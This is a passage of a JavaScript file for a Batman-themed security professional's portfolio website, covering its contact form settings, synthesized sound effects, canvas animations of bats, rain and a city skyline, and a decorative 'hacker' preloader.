/* =========================================================
   MANPREET — Dark Knight Portfolio · interactions
   ========================================================= */
(() => {
  'use strict';

  /* ---------------------------------------------------------
     CONTACT DELIVERY — where "Send the Signal" goes
     Paste your free Web3Forms access key below (get it at https://web3forms.com).
     With a key, enquiries are delivered straight to that inbox with the visitor's
     email as Reply-To. Left empty, the form falls back to opening the visitor's
     own mail app, pre-addressed to `inbox`.
     The key is designed to be public — it can only send mail to your own address.
     --------------------------------------------------------- */
  const CONFIG = {
    web3formsKey: '',
    inbox: 'm.infosec6@gmail.com',
  };

  const $ = (s, c = document) => c.querySelector(s);
  const $$ = (s, c = document) => [...c.querySelectorAll(s)];
  const rand = (a, b) => a + Math.random() * (b - a);
  const clamp = (v, a, b) => Math.max(a, Math.min(b, v));
  const lerp = (a, b, t) => a + (b - a) * t;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const isTouch = matchMedia('(hover: none), (pointer: coarse)').matches;
  const finePointer = matchMedia('(hover: hover) and (pointer: fine)').matches;
  const DPR_CAP = isTouch ? 1.5 : 2;

  const BAT_D = 'M100 34 L106 32 L111 16 L115 34 Q150 38 196 14 Q170 34 176 56 Q160 44 150 60 Q132 50 126 72 Q108 74 100 92 Q92 74 74 72 Q68 50 50 60 Q40 44 24 56 Q30 34 4 14 Q50 38 85 34 L89 16 L94 32 Z';
  const BAT = new Path2D(BAT_D);

  const store = {
    get(k) { try { return sessionStorage.getItem(k); } catch { return null; } },
    set(k, v) { try { sessionStorage.setItem(k, v); } catch { /* storage blocked */ } },
  };

  // mission brief: services the visitor has picked (shared by the Services section and the contact form)
  const picked = new Set();
  let briefOrder = [];
  let clearBrief = () => {};
  const pickedList = () => [...picked].sort((a, b) => {
    const ia = briefOrder.indexOf(a), ib = briefOrder.indexOf(b);
    return (ia < 0 ? 99 : ia) - (ib < 0 ? 99 : ib);
  });

  // shared input: mouse/touch position, or phone tilt when available
  const pointer = { x: innerWidth / 2, y: innerHeight / 2 };
  const tilt = { x: 0.5, y: 0.5, active: false };
  const aim = () => (tilt.active ? tilt : {
    x: innerWidth ? clamp(pointer.x / innerWidth, 0, 1) : 0.5,
    y: innerHeight ? clamp(pointer.y / innerHeight, 0, 1) : 0.5,
  });

  /* ---------- toast ---------- */
  const toastEl = $('#toast');
  let toastTimer;
  function toast(msg) {
    if (!toastEl) return;
    toastEl.textContent = msg;
    toastEl.classList.add('show');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => toastEl.classList.remove('show'), 2800);
  }

  /* ---------- flying bat sprite ---------- */
  function drawFlyingBat(ctx, x, y, s, phase, dir, color) {
    const flap = Math.sin(phase);
    const tipY = -s * 0.55 * flap;
    ctx.save();
    ctx.translate(x, y);
    ctx.scale(dir, 1);
    ctx.fillStyle = color;
    ctx.beginPath();
    for (const side of [-1, 1]) {
      ctx.moveTo(0, -s * 0.12);
      ctx.quadraticCurveTo(side * s * 0.45, tipY - s * 0.35, side * s, tipY);
      ctx.quadraticCurveTo(side * s * 0.78, tipY * 0.35 + s * 0.14, side * s * 0.62, s * 0.2);
      ctx.quadraticCurveTo(side * s * 0.46, s * 0.06, side * s * 0.32, s * 0.24);
      ctx.quadraticCurveTo(side * s * 0.18, s * 0.1, 0, s * 0.28);
    }
    ctx.fill();
    ctx.beginPath();
    ctx.ellipse(0, s * 0.06, s * 0.12, s * 0.24, 0, 0, Math.PI * 2);
    ctx.fill();
    ctx.beginPath();
    ctx.moveTo(-s * 0.1, -s * 0.12);
    ctx.lineTo(-s * 0.07, -s * 0.3);
    ctx.lineTo(-s * 0.02, -s * 0.14);
    ctx.lineTo(s * 0.02, -s * 0.14);
    ctx.lineTo(s * 0.07, -s * 0.3);
    ctx.lineTo(s * 0.1, -s * 0.12);
    ctx.fill();
    ctx.restore();
  }

  /* =========================================================
     SOUND — synthesized with WebAudio (no files)
     modes: 'fx' (click sounds, default) → 'all' (+ soft rain ambience) → 'off'
     ========================================================= */
  const sound = (() => {
    const MODES = ['fx', 'all', 'off'];
    let ac = null, master, rain, noise;
    let gestured = false;
    let mode = 'fx';
    try { const m = localStorage.getItem('uk-sound'); if (MODES.includes(m)) mode = m; } catch { /* storage blocked */ }
    function build() {
      const AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) return false;
      ac = new AC();
      master = ac.createGain();
      master.gain.value = 0.9;
      master.connect(ac.destination);
      const len = ac.sampleRate * 2;
      noise = ac.createBuffer(1, len, ac.sampleRate);
      const d = noise.getChannelData(0);
      for (let i = 0; i < len; i++) d[i] = Math.random() * 2 - 1;
      const src = ac.createBufferSource();
      src.buffer = noise;
      src.loop = true;
      // soft, distant rain: band-limited noise, well below the click sounds
      const hp = ac.createBiquadFilter();
      hp.type = 'highpass';
      hp.frequency.value = 450;
      const lp = ac.createBiquadFilter();
      lp.type = 'lowpass';
      lp.frequency.value = 2400;
      rain = ac.createGain();
      rain.gain.value = 0;
      src.connect(hp);
      hp.connect(lp);
      lp.connect(rain);
      rain.connect(master);
      src.start();
      return true;
    }
    function ensure() {
      if (!gestured) return false; // browsers only allow audio after a click/tap/key
      if (!ac && !build()) return false;
      if (ac.state !== 'running') ac.resume();
      return true;
    }
    function applyRain() {
      if (!ac) return;
      rain.gain.cancelScheduledValues(ac.currentTime);
      rain.gain.setTargetAtTime(mode === 'all' ? 0.022 : 0, ac.currentTime, 0.8);
    }
    function tone(freq, { type = 'sine', dur = 0.12, vol = 0.14, delay = 0, to = null, attack = 0.004 } = {}) {
      const t = ac.currentTime + delay;
      const o = ac.createOscillator();
      const g = ac.createGain();
      o.type = type;
      o.frequency.setValueAtTime(freq, t);
      if (to) o.frequency.exponentialRampToValueAtTime(to, t + dur);
      g.gain.setValueAtTime(0.0001, t);
      g.gain.exponentialRampToValueAtTime(vol, t + attack);
      g.gain.exponentialRampToValueAtTime(0.0001, t + dur);
      o.connect(g);
      g.connect(master);
      o.start(t);
      o.stop(t + dur + 0.02);
    }
    function burst({ type = 'lowpass', f0 = 200, f1 = 80, q = 0.7, dur = 2.5, vol = 0.8, attack = 0.02, delay = 0 }) {
      const t = ac.currentTime + delay;
      const src = ac.createBufferSource();
      src.buffer = noise;
      src.loop = true;
      const flt = ac.createBiquadFilter();
      flt.type = type;
      flt.Q.value = q;
      flt.frequency.setValueAtTime(f0, t);
      flt.frequency.exponentialRampToValueAtTime(Math.max(20, f1), t + dur);
      const g = ac.createGain();
      g.gain.setValueAtTime(0.0001, t);
      g.gain.exponentialRampToValueAtTime(vol, t + attack);
      g.gain.exponentialRampToValueAtTime(0.0001, t + dur);
      src.connect(flt);
      flt.connect(g);
      g.connect(master);
      src.start(t, Math.random());
      src.stop(t + dur + 0.1);
    }
    // struck metal: inharmonic partials (free-bar mode ratios) + a bright noise transient + optional low "body"
    // `shimmer` adds a slightly detuned twin to the fundamental so it beats slowly, like a singing bowl
    function metal(f0, { decay = 0.12, vol = 0.14, delay = 0, ratios = [1, 2.76, 5.4], amps = [1, 0.55, 0.3], noise = 0.6, body = 0, attack = 0.0015, shimmer = 0 } = {}) {
      const t = ac.currentTime + delay;
      const partial = (freq, v, d) => {
        const o = ac.createOscillator();
        const g = ac.createGain();
        o.type = 'sine';
        o.frequency.setValueAtTime(freq, t);
        g.gain.setValueAtTime(0.0001, t);
        g.gain.exponentialRampToValueAtTime(v, t + attack);
        g.gain.exponentialRampToValueAtTime(0.0001, t + d);
        o.connect(g);
        g.connect(master);
        o.start(t);
        o.stop(t + d + 0.05);
      };
      ratios.forEach((r, i) => {
        const d = Math.max(0.02, decay * (1 - i * 0.18));
        partial(f0 * r, vol * amps[i], d);
        if (shimmer && i === 0) partial(f0 + shimmer, vol * amps[i] * 0.7, d);
      });
      if (noise) burst({ type: 'bandpass', f0: Math.min(9000, f0 * 3), f1: Math.min(9000, f0 * 2.5), q: 1.4, dur: 0.03, vol: vol * noise, attack: 0.001, delay });
      if (body) tone(160, { dur: 0.05, vol: body * 1.2, to: 80, delay });
    }
    // singing-bowl chime: soft mallet, bowl partial ratios, long gentle ring
    const bowl = (f0, { vol = 0.03, decay = 1.6, delay = 0, shimmer = 1.2 } = {}) =>
      metal(f0, { vol, decay, delay, shimmer, attack: 0.014, ratios: [1, 2.71, 5.15], amps: [1, 0.3, 0.09], noise: 0 });
    // soft spinning air: low-passed noise (no hiss) that swells to a peak and fades,
    // with a gentle flutter whose rate follows the spin — speeds up, then winds down
    function swirl(dur, { vol = 0.1, lo = 240, hi = 900, peak = 0.45, rates = [3, 8, 2], depth = 0.2, delay = 0 } = {}) {
      const t = ac.currentTime + delay;
      const tp = t + dur * peak;
      const src = ac.createBufferSource();
      src.buffer = noise;
      src.loop = true;
      const lp = ac.createBiquadFilter();
      lp.type = 'lowpass';
      lp.Q.value = 0.8;
      lp.frequency.setValueAtTime(lo, t);
      lp.frequency.exponentialRampToValueAtTime(hi, tp);
      lp.frequency.exponentialRampToValueAtTime(lo * 0.8, t + dur);
      const flutter = ac.createGain();
      flutter.gain.value = 1 - depth;
      const lfo = ac.createOscillator();
      const lfoAmt = ac.createGain();
      lfoAmt.gain.value = depth;
      lfo.frequency.setValueAtTime(rates[0], t);
      lfo.frequency.linearRampToValueAtTime(rates[1], tp);
      lfo.frequency.linearRampToValueAtTime(rates[2], t + dur);
      lfo.connect(lfoAmt);
      lfoAmt.connect(flutter.gain);
      const g = ac.createGain();
      g.gain.setValueAtTime(0.0001, t);
      g.gain.exponentialRampToValueAtTime(vol, tp);
      g.gain.exponentialRampToValueAtTime(0.0001, t + dur);
      src.connect(lp);
      lp.connect(flutter);
      flutter.connect(g);
      g.connect(master);
      src.start(t, Math.random());
      src.stop(t + dur + 0.05);
      lfo.start(t);
      lfo.stop(t + dur + 0.05);
    }
    // short servo whirr for mechanical switches
    function servo(delay = 0, dur = 0.13) {
      const t = ac.currentTime + delay;
      const o = ac.createOscillator();
      const f = ac.createBiquadFilter();
      const g = ac.createGain();
      o.type = 'sawtooth';
      o.frequency.setValueAtTime(420, t);
      o.frequency.exponentialRampToValueAtTime(780, t + dur);
      f.type = 'bandpass';
      f.frequency.value = 1300;
      f.Q.value = 3;
      g.gain.setValueAtTime(0.0001, t);
      g.gain.exponentialRampToValueAtTime(0.012, t + 0.02);
      g.gain.exponentialRampToValueAtTime(0.0001, t + dur);
      o.connect(f);
      f.connect(g);
      g.connect(master);
      o.start(t);
      o.stop(t + dur + 0.02);
    }
    const SFX = {
      // generic UI click — a crisp metallic tick
      tick: (f = 1700) => metal(f, { decay: 0.09, vol: 0.16, noise: 0.5, body: 0.035 }),
      // barely-there hover
      hover: () => metal(3400, { decay: 0.04, vol: 0.05, ratios: [1, 2.76], amps: [1, 0.4], noise: 0.3 }),
      // category switch (Offensive / AI Security / Reporting & Intel): click, servo, latch
      filter: () => {
        metal(950, { decay: 0.07, vol: 0.16, noise: 0.7, body: 0.04 });
        servo(0.02, 0.13);
        metal(2300, { decay: 0.08, vol: 0.14, delay: 0.13, noise: 0.4 });
      },
      // service added / removed from the mission brief: a two-stage metal latch
      select: () => {
        metal(1400, { decay: 0.07, vol: 0.16, noise: 0.6, body: 0.03 });
        metal(2100, { decay: 0.28, vol: 0.14, delay: 0.055, ratios: [1, 2.76, 5.4, 8.93], amps: [1, 0.5, 0.28, 0.12] });
      },
      deselect: () => {
        metal(2000, { decay: 0.07, vol: 0.14, noise: 0.5 });
        metal(1250, { decay: 0.2, vol: 0.14, delay: 0.055, body: 0.03 });
      },
      // "Request engagement": a heavy metal lock-in — impact, sub drop, ringing steel, blade shing
      engage: () => {
        burst({ type: 'bandpass', f0: 1600, f1: 380, q: 0.9, dur: 0.22, vol: 0.22, attack: 0.002 });
        tone(72, { dur: 0.38, vol: 0.14, to: 38 });
        metal(520, { decay: 1.3, vol: 0.14, delay: 0.01, ratios: [1, 2.76, 5.4, 8.93, 13.34], amps: [1, 0.7, 0.45, 0.25, 0.12], noise: 0.4 });
        burst({ type: 'highpass', f0: 3000, f1: 9000, q: 0.7, dur: 0.35, vol: 0.14, attack: 0.02, delay: 0.03 });
      },
      // message delivered — ringing steel pings over a low swell
      sent: () => {
        [0, 0.3, 0.6].forEach((d, i) => metal(1318.5, { decay: 0.9, vol: 0.14 / (i + 1), delay: d, ratios: [1, 2.76, 5.4], amps: [1, 0.35, 0.15], noise: 0.2 }));
        tone(65, { dur: 0.6, vol: 0.08, to: 45 });
      },
      error: () => {
        metal(240, { decay: 0.12, vol: 0.16, noise: 0.8, body: 0.05 });
        metal(200, { decay: 0.14, vol: 0.16, noise: 0.8, delay: 0.13, body: 0.05 });
      },
      // utility-belt pouch: metal snap
      snap: () => metal(2600, { decay: 0.05, vol: 0.16, noise: 0.9, body: 0.04 }),
      // emblem morph / certificate flare: a breath of air and a soft bowl chime
      whoosh: () => {
        swirl(0.75, { vol: 0.145, lo: 260, hi: 750, peak: 0.4, rates: [3, 5, 2] });
        bowl(523.25, { vol: 0.125, decay: 1.3, delay: 0.1, shimmer: 1.4 });
      },
      // 1966 spinning-bat transition: air that swells and spins with the bat, a low bowl chime
      // as it covers the screen and a softer one a fifth above as it reveals the section
      spin: () => {
        swirl(1.35, { vol: 0.145, lo: 220, hi: 950, peak: 0.46, rates: [2.5, 9, 2] });
        bowl(392, { vol: 0.125, decay: 2, delay: 0.5, shimmer: 1.1 });
        bowl(587.33, { vol: 0.03, decay: 1.7, delay: 0.68, shimmer: 1.6 });
      },
      thunder: (power = 1) => {
        burst({ f0: 1200, f1: 80, dur: 0.4, vol: 0.4 * power, attack: 0.004 });
        burst({ f0: 200, f1: 38, dur: 3.4, vol: 0.75 * power, attack: 0.09, delay: 0.14, q: 0.5 });
      },
    };
    return {
      get mode() { return mode; },
      // call from the first click/tap/keypress so audio is allowed to start
      unlock() {
        if (gestured) return;
        gestured = true;
        if (mode !== 'off' && ensure()) applyRain();
      },
      cycle() {
        mode = MODES[(MODES.indexOf(mode) + 1) % MODES.length];
        try { localStorage.setItem('uk-sound', mode); } catch { /* storage blocked */ }
        if (mode !== 'off') ensure();
        applyRain();
        return mode;
      },
      play(name, ...args) {
        if (mode === 'off' || !SFX[name] || !ensure()) return;
        try { SFX[name](...args); } catch { /* audio is best-effort */ }
      },
    };
  })();

  /* =========================================================
     FX LAYER — click sparks, cursor embers, bat bursts & swarms
     ========================================================= */
  const fx = (() => {
    const c = $('#fx');
    const ctx = c.getContext('2d');
    let W = 0, H = 0, running = false, last = 0;
    const parts = [];
    function size() {
      const dpr = Math.min(window.devicePixelRatio || 1, DPR_CAP);
      W = innerWidth;
      H = innerHeight;
      c.width = Math.round(W * dpr);
      c.height = Math.round(H * dpr);
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    }
    size();
    addEventListener('resize', size);
    function kick() {
      if (running) return;
      running = true;
      last = performance.now();
      requestAnimationFrame(loop);
    }
    function loop(now) {
      const dt = clamp((now - last) / 16.67, 0.2, 3);
      last = now;
      ctx.clearRect(0, 0, W, H);
      for (let i = parts.length - 1; i >= 0; i--) {
        const p = parts[i];
        p.life -= dt;
        if (p.kind === 'bat') {
          const inside = p.x > -60 && p.x < W + 60 && p.y > -60 && p.y < H + 60;
          if (inside) p.entered = true;
          if (p.life <= 0 || (p.entered && !inside)) { parts.splice(i, 1); continue; }
        } else if (p.life <= 0) { parts.splice(i, 1); continue; }
        const k = p.life / p.max;
        if (p.kind === 'spark') {
          p.vy += 0.14 * dt;
          p.vx *= 0.97;
          p.vy *= 0.97;
          p.x += p.vx * dt;
          p.y += p.vy * dt;
          ctx.strokeStyle = `rgba(${p.rgb},${k})`;
          ctx.lineWidth = p.size;
          ctx.beginPath();
          ctx.moveTo(p.x, p.y);
          ctx.lineTo(p.x - p.vx * 2.2, p.y - p.vy * 2.2);
          ctx.stroke();
        } else if (p.kind === 'ember') {
          p.x += p.vx * dt;
          p.y += p.vy * dt;
          ctx.fillStyle = `rgba(${p.rgb},${k * 0.75})`;
          ctx.beginPath();
          ctx.arc(p.x, p.y, Math.max(0.1, p.size * k), 0, Math.PI * 2);
          ctx.fill();
        } else if (p.kind === 'ring') {
          ctx.strokeStyle = `rgba(${p.rgb},${k * 0.8})`;
          ctx.lineWidth = 1.5;
          ctx.beginPath();
          ctx.arc(p.x, p.y, p.size + (1 - k) * p.grow, 0, Math.PI * 2);
          ctx.stroke();
        } else if (p.kind === 'bat') {
          p.x += p.vx * dt;
          p.y += (p.vy + Math.sin(now * 0.004 + p.w) * p.wob) * dt;
          p.vy += p.g * dt;
          p.p += p.f * dt;
          if (p.glow && !isTouch) { ctx.shadowColor = 'rgba(255,210,63,0.7)'; ctx.shadowBlur = 10; }
          drawFlyingBat(ctx, p.x, p.y, p.size, p.p, p.vx < 0 ? -1 : 1, p.color);
          ctx.shadowBlur = 0;
        }
      }
      if (parts.length) requestAnimationFrame(loop);
      else { running = false; ctx.clearRect(0, 0, W, H); }
    }
    return {
      burst(x, y, n = 16, rgb = '255,210,63') {
        for (let i = 0; i < n; i++) {
          const a = rand(0, Math.PI * 2);
          const s = rand(2, 7.5);
          parts.push({ kind: 'spark', x, y, vx: Math.cos(a) * s, vy: Math.sin(a) * s - 1.5, life: rand(22, 44), max: 44, size: rand(1, 2.2), rgb });
        }
        parts.push({ kind: 'ring', x, y, size: 4, grow: 64, life: 30, max: 30, rgb });
        kick();
      },
      ember(x, y) {
        if (parts.length > 380) return;
        parts.push({ kind: 'ember', x: x + rand(-3, 3), y: y + rand(-3, 3), vx: rand(-0.35, 0.35), vy: rand(-0.7, -0.1), size: rand(1.2, 2.6), life: rand(20, 42), max: 42, rgb: Math.random() < 0.8 ? '255,210,63' : '255,140,40' });
        kick();
      },
      bats(x, y, n = 3) {
        for (let i = 0; i < n; i++) {
          parts.push({ kind: 'bat', x, y, vx: rand(2, 6) * (Math.random() < 0.5 ? -1 : 1), vy: rand(-5, -2), g: -0.02, size: rand(6, 11), p: rand(0, 6), f: rand(0.45, 0.65), w: rand(0, 6), wob: 0.5, life: 150, max: 150, color: 'rgba(255,210,63,0.92)', entered: true });
        }
        kick();
      },
      swarm() {
        const n = innerWidth < 760 ? 26 : 50;
        for (let i = 0; i < n; i++) {
          parts.push({ kind: 'bat', x: W + rand(20, W * 0.5), y: H * rand(0.35, 1.1), vx: -rand(5, 11), vy: -rand(1.2, 4.2), g: 0, size: rand(10, 30), p: rand(0, 6), f: rand(0.35, 0.55), w: rand(0, 6), wob: 1.2, life: 420, max: 420, color: 'rgba(3,3,5,0.96)', glow: true });
        }
        kick();
      },
    };
  })();

  /* =========================================================
     PRELOADER
     ========================================================= */
  function boot(done) {
    const pl = $('#preloader');
    if (!pl) { done(); return; }
    if (store.get('uk-booted')) { pl.remove(); done(); return; }
    const lines = [
      ['> establishing encrypted uplink…', ''],
      ['> decrypting case files [UK-0786]…', ''],
      ['> calibrating bat-signal…', ''],
      ['> ACCESS GRANTED — welcome to the Batcave', 'ok'],
    ];
    const log = $('.pl-log', pl);
    const pct = $('.pl-pct', pl);
    const bar = $('.pl-bar i', pl);
    const total = 2300;
    const t0 = performance.now();
    let shown = 0;
    let finished = false;
    function finish() {
      if (finished) return;
      finished = true;
      store.set('uk-booted', '1');
      pl.classList.add('done');
      setTimeout(done, 380);
      setTimeout(() => pl.remove(), 1500);
    }
    (function step(now) {
      if (finished) return;
      const k = clamp((now - t0) / total, 0, 1);
      const e = 1 - Math.pow(1 - k, 2.2);
      pct.textContent = String(Math.round(e * 100)).padStart(3, '0');
      bar.style.transform = `scaleX(${e})`;
      const want = Math.min(lines.length, Math.floor(k * (lines.length + 0.4)));
      while (shown < want) {
        const p = document.createElement('p');
        p.textContent = lines[shown][0];
        if (lines[shown][1]) p.className = lines[shown][1];
        log.appendChild(p);
        shown++;
      }
      if (k < 1) requestAnimationFrame(step);
      else setTimeout(finish, 280);
    })(t0);
    pl.addEventListener('click', finish);
  }

  /* =========================================================
     HERO TITLE — split letters + reactive typography
     ========================================================= */
  function splitTitle() {
    let base = 250;
    $$('.hero-title .split').forEach((el) => {
      const text = el.textContent;
      el.textContent = '';
      [...text].forEach((ch, i) => {
        const s = document.createElement('span');
        s.className = 'char';
        s.textContent = ch;
        s.style.setProperty('--i', i);
        s.style.setProperty('--base', base + 'ms');
        el.appendChild(s);
      });
      base += 220;
    });
  }

  const titleFx = (() => {
    let settled = false;
    let rest = [];
    let words = [];
    let chars = [];
    const reset = (c) => {
      c.style.setProperty('--tx', '0px');
      c.style.setProperty('--ty', '0px');
      c.style.setProperty('--rot', '0deg');
      c.style.setProperty('--sc', '1');
      c.classList.remove('hot');
    };
    function measure() {
      rest = chars.map((c) => [words.indexOf(c.parentElement), c.offsetLeft + c.offsetWidth / 2, c.offsetTop + c.offsetHeight / 2]);
    }
    function wave() {
      chars.forEach((c, i) => setTimeout(() => {
        c.style.setProperty('--ty', '-26px');
        c.style.setProperty('--sc', '1.08');
        c.classList.add('hot');
        setTimeout(() => reset(c), 280);
      }, i * 45));
      words.forEach((w) => {
        w.classList.remove('burst');
        void w.offsetWidth;
        w.classList.add('burst');
        setTimeout(() => w.classList.remove('burst'), 700);
      });
    }
    function init() {
      const title = $('.hero-title');
      const hero = $('.hero');
      if (!title) return;
      words = $$('.glitch', title);
      chars = $$('.char', title);
      hero.addEventListener('pointermove', (e) => {
        if (!settled || e.pointerType !== 'mouse') return;
        const gr = words.map((w) => w.getBoundingClientRect());
        const R = 260;
        chars.forEach((c, i) => {
          const [wi, ox, oy] = rest[i];
          const dx = gr[wi].left + ox - e.clientX;
          const dy = gr[wi].top + oy - e.clientY;
          const d = Math.hypot(dx, dy);
          if (d >= R) { reset(c); return; }
          const k = 1 - d / R;
          const n = d || 1;
          c.style.setProperty('--tx', `${(dx / n) * k * 30}px`);
          c.style.setProperty('--ty', `${(dy / n) * k * 24}px`);
          c.style.setProperty('--rot', `${(dx / R) * k * 20}deg`);
          c.style.setProperty('--sc', String(1 + k * 0.16));
          c.classList.toggle('hot', k > 0.5);
        });
      });
      hero.addEventListener('pointerleave', () => chars.forEach(reset));
      title.addEventListener('click', wave);
      addEventListener('resize', () => { if (settled) measure(); });
    }
    function settle() {
      $('.hero-title')?.classList.add('settled');
      settled = true;
      requestAnimationFrame(measure);
    }
    return { init, settle, wave };
  })();

  /* =========================================================
     TYPED ROLES
     ========================================================= */
  function typedRoles() {
    const el = $('#typed');
    if (!el) return;
    const roles = [
      'Application Security Specialist',
      'Web Application Pentester',
      'Source Code Review Expert',
      'Network Penetration Tester',
      'Certified Ethical Hacker',
      'CCSP · Cloud Security',
    ];
    let r = 0;
    let i = roles[0].length;
    let deleting = true;
    function tick() {
      if (deleting) {
        i--;
        el.textContent = roles[r].slice(0, i);
        if (i <= 0) { deleting = false; r = (r + 1) % roles.length; setTimeout(tick, 350); return; }
        setTimeout(tick, 28);
      } else {
        i++;
        el.textContent = roles[r].slice(0, i);
        if (i >= roles[r].length) { deleting = true; setTimeout(tick, 2000); return; }
        setTimeout(tick, 58 + Math.random() * 40);
      }
    }
    setTimeout(tick, 3200);
  }

  /* =========================================================
     PHONE TILT (gyroscope) — steers the signal and the emblem
     ========================================================= */
  function orientation() {
    if (!isTouch || !('DeviceOrientationEvent' in window)) return;
    const onOri = (e) => {
      if (e.gamma == null || e.beta == null) return;
      tilt.active = true;
      tilt.x = clamp(0.5 + e.gamma / 50, 0, 1);
      tilt.y = clamp(0.5 + (e.beta - 50) / 60, 0, 1);
    };
    const D = window.DeviceOrientationEvent;
    if (typeof D.requestPermission === 'function') {
      // iOS asks once, on the visitor's first tap on the hero or the emblem
      const ask = (e) => {
        if (!e.target.closest('.hero, .emblem-sec')) return;
        removeEventListener('touchend', ask);
        D.requestPermission().then((s) => { if (s === 'granted') addEventListener('deviceorientation', onOri); }).catch(() => {});
      };
      addEventListener('touchend', ask);
    } else {
      addEventListener('deviceorientation', onOri);
    }
  }

  /* =========================================================
     GOTHAM HERO CANVAS
     ========================================================= */
  function gotham() {
    const canvas = $('#gotham');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    const hero = canvas.parentElement;
    const hint = $('.sky-hint');
    if (isTouch && $('.sky-verb')) $('.sky-verb').textContent = 'Tap';

    let W = 0, H = 0, dpr = 1;
    let sky, fog;
    let layers = [];
    let lights = [];
    let drops = [];
    let clouds = [];
    let bats = [];
    let bolts = [];
    let src = { x: 0, y: 0 };
    let smx = 0.5, smy = 0.5;
    let flash = 0;
    let nextBolt = performance.now() + rand(3500, 7000);
    let nextBats = performance.now() + 1800;
    let visible = true;
    let raf = 0;
    let last = performance.now();
    let scrollY = 0;
    const MARGIN = 60;

    function makeLayer(cfg, special) {
      const c = document.createElement('canvas');
      const lw = W + MARGIN * 2;
      c.width = Math.round(lw * dpr);
      c.height = Math.round(H * dpr);
      const g = c.getContext('2d');
      g.scale(dpr, dpr);
      const mobile = W < 720;
      const hMul = mobile ? 0.78 : 1;
      let x = -20;
      const antennas = [];
      while (x < lw + 20) {
        const w = rand(cfg.minW, cfg.maxW) * (mobile ? 0.75 : 1);
        let h = rand(cfg.minH, cfg.maxH) * H * hMul;
        if (Math.random() < 0.12) h *= 1.35;
        const top = H - h;
        g.fillStyle = cfg.color;
        g.fillRect(x, top, w, h + 2);
        const r = Math.random();
        if (r < 0.28) {
          const sw = w * rand(0.4, 0.7);
          const sh = rand(10, 28);
          g.fillRect(x + (w - sw) / 2, top - sh, sw, sh + 1);
          if (Math.random() < 0.6) {
            const aw = sw * 0.35;
            const ah = rand(8, 18);
            g.fillRect(x + (w - aw) / 2, top - sh - ah, aw, ah + 1);
          }
        } else if (r < 0.42) {
          g.beginPath();
          g.moveTo(x + w * 0.2, top + 1);
          g.lineTo(x + w / 2, top - rand(30, 70));
          g.lineTo(x + w * 0.8, top + 1);
          g.fill();
        } else if (r < 0.62) {
          const ax = x + w * rand(0.3, 0.7);
          const ah = rand(18, 50);
          g.fillRect(ax - 1, top - ah, 2, ah + 1);
          antennas.push({ x: ax, y: top - ah, p: Math.random() * 6, s: rand(0.8, 1.6) });
        }
        if (cfg.ledges && h > 120) {
          g.fillStyle = cfg.ledge;
          for (let ly = top + 30; ly < H; ly += rand(40, 70)) g.fillRect(x - 2, ly, w + 4, 2);
        }
        if (cfg.windows > 0) {
          const cols = Math.floor((w - 8) / 7);
          const rows = Math.floor((h - 12) / 10);
          for (let cx = 0; cx < cols; cx++) {
            for (let cy = 0; cy < rows; cy++) {
              if (Math.random() < cfg.windows) {
                const warm = Math.random() < 0.82;
                const a = rand(0.25, 0.85) * cfg.wAlpha;
                g.fillStyle = warm ? `rgba(255, ${Math.round(rand(180, 215))}, ${Math.round(rand(70, 110))}, ${a})` : `rgba(170, 200, 255, ${a * 0.8})`;
                g.fillRect(x + 5 + cx * 7, top + 8 + cy * 10, 3, 4);
              }
            }
          }
        }
        x += w + rand(-4, cfg.gap);
      }
      if (special) {
        const bw = mobile ? 70 : 96;
        const bh = H * (mobile ? 0.3 : 0.34);
        const bx = MARGIN + W * (mobile ? 0.72 : 0.8) - bw / 2;
        const bt = H - bh;
        g.fillStyle = cfg.color;
        g.fillRect(bx, bt, bw, bh);
        g.fillRect(bx - 6, bt - 4, bw + 12, 6);
        g.fillRect(bx + bw * 0.35, bt - 16, bw * 0.3, 14);
        g.fillStyle = 'rgba(255, 205, 90, 0.5)';
        for (let cy = 0; cy < 6; cy++) {
          for (let cx = 0; cx < 5; cx++) if (Math.random() < 0.35) g.fillRect(bx + 10 + cx * ((bw - 20) / 5), bt + 18 + cy * 16, 5, 7);
        }
        special.x = bx + bw / 2 - MARGIN;
        special.y = bt - 18;
      }
      return { canvas: c, antennas, par: cfg.par, scroll: cfg.scroll };
    }

    function buildCity() {
      layers = [];
      const specs = [
        { color: '#0d121b', minW: 50, maxW: 120, minH: 0.26, maxH: 0.52, gap: 10, windows: 0.035, wAlpha: 0.45, par: 10, scroll: 0.08, ledges: false },
        { color: '#080a10', minW: 36, maxW: 100, minH: 0.18, maxH: 0.38, gap: 16, windows: 0.06, wAlpha: 0.75, par: 24, scroll: 0.16, ledges: true, ledge: '#0c0f16' },
        { color: '#020203', minW: 40, maxW: 130, minH: 0.08, maxH: 0.22, gap: 26, windows: 0.09, wAlpha: 1, par: 44, scroll: 0.28, ledges: true, ledge: '#07080b' },
      ];
      const hq = { x: 0, y: 0 };
      specs.forEach((s, i) => layers.push(makeLayer(s, i === 1 ? hq : null)));
      src = hq;
      lights = layers.flatMap((l, li) => l.antennas.map((a) => ({ ...a, layer: li })));
    }

    function buildRain() {
      const n = Math.min(isTouch ? 170 : 360, Math.round((W * H) / 5200));
      drops = Array.from({ length: n }, () => ({
        x: rand(-50, W + 50), y: rand(-H, H), l: rand(10, 24), v: rand(9, 16), a: rand(0.08, 0.3),
      }));
    }

    function buildClouds() {
      clouds = [];
      const n = W < 720 ? 4 : 8;
      for (let i = 0; i < n; i++) {
        const r = Math.max(60, rand(W * 0.18, W * 0.38));
        const c = document.createElement('canvas');
        c.width = Math.round(r * 2);
        c.height = Math.round(r);
        const g = c.getContext('2d');
        for (let k = 0; k < 7; k++) {
          const cx = rand(r * 0.4, r * 1.6);
          const cy = rand(r * 0.35, r * 0.65);
          const cr = rand(r * 0.25, r * 0.5);
          const grd = g.createRadialGradient(cx, cy, 0, cx, cy, cr);
          grd.addColorStop(0, 'rgba(60, 70, 92, 0.16)');
          grd.addColorStop(1, 'rgba(60, 70, 92, 0)');
          g.fillStyle = grd;
          g.fillRect(0, 0, c.width, c.height);
        }
        clouds.push({ c, x: rand(-r, W), y: rand(-r * 0.3, H * 0.45), v: rand(0.05, 0.18) });
      }
    }

    function resize() {
      const r = hero.getBoundingClientRect();
      if (r.width < 10 || r.height < 10) return;
      dpr = Math.min(window.devicePixelRatio || 1, isTouch ? 1.25 : 1.75);
      W = r.width;
